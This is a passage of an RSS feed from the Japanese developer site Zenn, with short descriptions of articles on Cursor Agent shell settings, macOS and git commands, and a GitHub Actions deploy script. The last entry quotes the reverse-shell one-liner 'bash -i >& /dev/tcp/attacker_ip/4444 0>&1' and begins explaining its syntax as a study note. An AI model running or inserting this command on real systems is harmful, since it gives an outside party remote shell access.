url="https://res.cloudinary.com/zenn/image/upload/s--25doY1nH--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2583%2595%25E3%2582%25A1%25E3%2582%25A4%25E3%2583%25AB%25E6%2595%25B4%25E7%2590%2586%25E8%2587%25AA%25E5%258B%2595%25E5%258C%2596%25E3%2581%258A%25E3%2581%2599%25E3%2581%2599%25E3%2582%2581%25E6%2589%258B%25E6%25B3%2595%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:GeneLab%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzhmMDIwOGRiNDQuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>GeneLab</dc:creator></item><item><title><![CDATA[macOSのシェル設定をzsh以外にしている場合にCursor Agentにzsh以外を使わせる方法]]></title><description><![CDATA[皆さん、AIと仲良くやってますか。僕はCursor Agent + Gemini 2.5 Pro (Thinking)が妙に肌に合いまして、設計からコーディングまで、幅広い作業を任せております。
+さて、Cursorに限ったことではありませんが、AIエージェントは必要に応じて様々な作業をやってくれます。コードの読み書きが主なものとなりますが、場合によってはシェル実行を伴うこともあります。
+以前の筆者は「AIのことはそこまで信用してないので、シェル実行はコマンドだけ示してくれたらこっちでやるよ」というスタンスでした。しかしながら、少しずつAIと打ち解けてきて、そろそろシェルの実行も任せてもい...]]></description><link>https://zenn.dev/nkzn/articles/cursor-change-shell</link><guid isPermaLink="true">https://zenn.dev/nkzn/articles/cursor-change-shell</guid><pubDate>Sat, 17 May 2025 07:25:13 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--AnpBRvIS--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:macOS%25E3%2581%25AE%25E3%2582%25B7%25E3%2582%25A7%25E3%2583%25AB%25E8%25A8%25AD%25E5%25AE%259A%25E3%2582%2592zsh%25E4%25BB%25A5%25E5%25A4%2596%25E3%2581%25AB%25E3%2581%2597%25E3%2581%25A6%25E3%2581%2584%25E3%2582%258B%25E5%25A0%25B4%25E5%2590%2588%25E3%2581%25ABCursor%2520Agent%25E3%2581%25ABzsh%25E4%25BB%25A5%25E5%25A4%2596%25E3%2582%2592%25E4%25BD%25BF%25E3%2582%258F%25E3%2581%259B%25E3%2582%258B%25E6%2596%25B9%25E6%25B3%2595%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:Nkzn%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EtL0FPaDE0R2hpRkgxVktGMXZZOFk2eEtfZl9PVklHS2pEeWxkWG42MzVLU0VEZEE9czI1MC1j%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>Nkzn</dc:creator></item><item><title><![CDATA[macOS の open コマンドに渡すアプリ名をインタラクティブに選択する]]></title><description><![CDATA[macOS の open コマンドに -a オプションを渡すことで、対象のパスを指定した macOS のアプリケーションで開ける。
+# カレントディレクトリを Visual Studio Code で開く
+open . -a 'Visual Studio Code'
+便利かどうかはさておき、この 'Visual Studio Code' の部分をインタラクティブに選択できないか試行錯誤した。
+まずは macOS にインストールされているアプリを列挙するために、/Applications フォルダを ls コマンドで探索する apps コマンドを考える。
+alias apps='\ls -...]]></description><link>https://zenn.dev/1000ch/articles/open-a-option-with-installed-apps</link><guid isPermaLink="true">https://zenn.dev/1000ch/articles/open-a-option-with-installed-apps</guid><pubDate>Fri, 16 May 2025 03:07:41 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--xV2Sdxlt--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:macOS%2520%25E3%2581%25AE%2520open%2520%25E3%2582%25B3%25E3%2583%259E%25E3%2583%25B3%25E3%2583%2589%25E3%2581%25AB%25E6%25B8%25A1%25E3%2581%2599%25E3%2582%25A2%25E3%2583%2597%25E3%2583%25AA%25E5%2590%258D%25E3%2582%2592%25E3%2582%25A4%25E3%2583%25B3%25E3%2582%25BF%25E3%2583%25A9%25E3%2582%25AF%25E3%2583%2586%25E3%2582%25A3%25E3%2583%2596%25E3%2581%25AB%25E9%2581%25B8%25E6%258A%259E%25E3%2581%2599%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25401000ch%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzFlZDJmOTVmZGMuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>@1000ch</dc:creator></item><item><title><![CDATA[git のサブコマンドを任意のディレクトリで実行する]]></title><description><![CDATA[git のサブコマンドを使った git リポジトリの操作は、そのディレクトリ配下で行うことが多いが、-C オプション[1]で git リポジトリのパスを指定することで任意のディレクトリで実行できる。
+git -C path/to/git/repository pull origin main
+例えばホームディレクトリ配下に git clone でクローンしたツールを更新する場合に、cd で移動して git pull でリモートのコミットを取得し、元のディレクトリに移動するという手順を考える。ここでは nodenv をホームディレクトリにクローンしている例を挙げる。
+# ホームディレクトリ...]]></description><link>https://zenn.dev/1000ch/articles/git-c-option</link><guid isPermaLink="true">https://zenn.dev/1000ch/articles/git-c-option</guid><pubDate>Thu, 15 May 2025 00:47:08 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--vwyXzAUv--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:git%2520%25E3%2581%25AE%25E3%2582%25B5%25E3%2583%2596%25E3%2582%25B3%25E3%2583%259E%25E3%2583%25B3%25E3%2583%2589%25E3%2582%2592%25E4%25BB%25BB%25E6%2584%258F%25E3%2581%25AE%25E3%2583%2587%25E3%2582%25A3%25E3%2583%25AC%25E3%2582%25AF%25E3%2583%2588%25E3%2583%25AA%25E3%2581%25A7%25E5%25AE%259F%25E8%25A1%258C%25E3%2581%2599%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25401000ch%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzFlZDJmOTVmZGMuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>@1000ch</dc:creator></item><item><title><![CDATA[GitHubActions 複数のCodeDeployのデプロイを新コンテナが立ち上がるまで待機するためのShell芸]]></title><description><![CDATA[GitHubActionsでCodeDeployのデプロイを行い、新コンテナが立ち上がるまで待機したい...しかも複数環境...なんてことはないでしょうか？
+私はあります、そんなときに使えるShell芸を紹介します。
+
+ コード例
+name: example workflow
+
+on:
+  workflow_call:
+    inputs:
+      ENVIRONMENT:
+        required: true
+        type: string
+      AWS_REGION:
+        required: false
+        type: strin...]]></description><link>https://zenn.dev/smartcamp/articles/e4d77a3550c3ea</link><guid isPermaLink="true">https://zenn.dev/smartcamp/articles/e4d77a3550c3ea</guid><pubDate>Mon, 12 May 2025 12:36:48 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--b0IokFBF--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:GitHubActions%2520%25E8%25A4%2587%25E6%2595%25B0%25E3%2581%25AECodeDeploy%25E3%2581%25AE%25E3%2583%2587%25E3%2583%2597%25E3%2583%25AD%25E3%2582%25A4%25E3%2582%2592%25E6%2596%25B0%25E3%2582%25B3%25E3%2583%25B3%25E3%2583%2586%25E3%2583%258A%25E3%2581%258C%25E7%25AB%258B%25E3%2581%25A1%25E4%25B8%258A%25E3%2581%258C%25E3%2582%258B%25E3%2581%25BE%25E3%2581%25A7%25E5%25BE%2585%25E6%25A9%259F%25E3%2581%2599%25E3%2582%258B%25E3%2581%259F%25E3%2582%2581%25E3%2581%25AEShell%25E8%258A%25B8%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_34:%25E8%2581%25B7%25E4%25BA%25BA%2Cx_220%2Cy_108/bo_3px_solid_rgb:d6e3ed%2Cg_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzUyNGYwMGIzM2MuanBlZw==%2Cr_20%2Cw_90%2Cx_92%2Cy_102/co_rgb:6e7b85%2Cg_south_west%2Cl_text:notosansjp-medium.otf_30:SMARTCAMP%2520Engineer%2520Blog%2Cx_220%2Cy_160/bo_4px_solid_white%2Cg_south_west%2Ch_50%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyL2JmYWFlYjUwNDguanBlZw==%2Cr_max%2Cw_50%2Cx_139%2Cy_84/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>職人</dc:creator></item><item><title><![CDATA[bash -i >& /dev/tcp/attacker_ip/4444 0>&1の解釈]]></title><description><![CDATA[リバースシェルの構文について1週間くらい悩んでいたのでメモ。
+
+bash -i
+
+対話形式(-i)のbashを起動
+
+コマンド &gt;&amp; ファイル名
+
+Aの標準出力と標準エラー出力をBに送る。
+!
+コマンド &gt;&amp; ファイル名とあるが、コマンド 1&gt;ファイル名 2&gt;&amp;1と同義。コマンド &amp;&gt; ファイル名でも可
+なお2&gt;&amp;1のようなリダイレクトは、2, &gt;&amp;, 1に分解できるようなものではなく、2&gt;&amp;1で一つの塊なので注意。分解できる前提で考えるとコマンド &gt;&amp; ファイル名の&g...]]></description><link>https://zenn.dev/tttttttttt/articles/54cdfd7c537c51</link><guid isPermaLink="true">https://zenn.dev/tttttttttt/articles/54cdfd7c537c51</guid><pubDate>Fri, 09 May 2025 14:13:53 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--xBxTzKbt--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:bash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252Fattacker_ip%252F4444%25200%253E%25261%25E3%2581%25AE%25E8%25A7%25A3%25E9%2587%2588%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:tttttttttt%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyL2IxZTcyNjQ1MWMuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>tttttttttt</dc:creator></item></channel></rss>
